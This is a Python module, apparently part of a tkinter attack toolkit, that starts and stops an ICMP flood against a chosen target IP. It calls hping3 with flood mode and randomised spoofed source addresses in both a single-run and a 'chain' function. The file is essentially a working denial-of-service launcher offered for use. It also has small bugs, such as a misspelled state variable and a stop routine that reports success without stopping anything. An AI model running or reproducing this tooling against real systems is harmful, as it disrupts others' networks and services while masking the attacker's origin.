import threading
import traceback
import subprocess
import signal
import queue

from tkinter import *

def startIcmpAttack(targetIp, terminalContentFrame, errorOutputContentFrame, colorConfig = "#252525") :
    global icmpAttackIsRunning, icmpAttackThreads, terminalLabel, errorOutputLabel

    icmpAttackIsRunning = False
    icmpAttackThreads = threading.Thread(target = lambda : sendIcmpPackets(targetIp))

    terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    terminalLabel.configure(bg = colorConfig) 
    errorOutputLabel.configure(bg = colorConfig)

    terminalLabel["text"] += "$ Running ICMP Flood Attack...\n\n"

    runIcmpAttack()

    terminalLabel.pack(anchor = NW)
    errorOutputLabel.pack(anchor = NW)

def stopIcmpAttack() :
    global icmpAttackThreads, icmpAttackIsRunning

    try:
        terminalLabel["text"] += "\n$ Stopping ICMP Flood Attack...\n\n"
        icmpAttackIsrunning = False
        icmpAttackThreads.join(0)
        icmpAttackThreads = None

        process.send_signal(signal.SIGINT)

        terminalLabel["text"] += "$ ICMP Flood Attack successfully stopped!\n"
    except (AttributeError, RuntimeError):
        errorOutputLabel["text"] += traceback.format_exc()
    except Exception as e:
        errorOutputLabel["text"] += "ERROR : \n" + e + "\n"

def runIcmpAttack() :
    global icmpAttackThreads, icmpAttackIsRunning
    icmpAttackIsRunning = True
    icmpAttackThreads.start()

def sendIcmpPackets(targetIP):
    global process
    terminalLabel["text"] += "$ Target IP : " + targetIP + "\n"
    process = subprocess.Popen(["hping3", "--icmp", "--flood", "--rand-source", targetIP])

def startIcmpAttackChain(queue, targetIP, chainTerminalContentFrame, chainErrorContentFrame) :
    chainTerminalLabel = Label(chainTerminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
    chainErrorOutputLabel = Label(chainErrorContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
    chainTerminalLabel.pack(anchor = NW)
    chainErrorOutputLabel.pack(anchor = NW)

    chainTerminalLabel["text"] += "$ Running ICMP Flood Attack...\n\n"
    icmpFloodProcess = subprocess.Popen(["hping3", "--icmp", "--flood", "--rand-source", targetIP])

    queue.put(icmpFloodProcess)

def stopIcmpAttackChain(chainTerminalContentFrame, chainErrorContentFrame) :
    chainTerminalLabel = Label(chainTerminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
    chainErrorOutputLabel = Label(chainErrorContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
    chainTerminalLabel.pack(anchor = NW)
    chainErrorOutputLabel.pack(anchor = NW)

    chainTerminalLabel["text"] += "\n$ Stopping ICMP Flood Attack...\n\n"
    chainTerminalLabel["text"] += "$ ICMP Flood Attack successfully stopped!\n"
    errorOutputLabel["text"] += traceback.format_exc()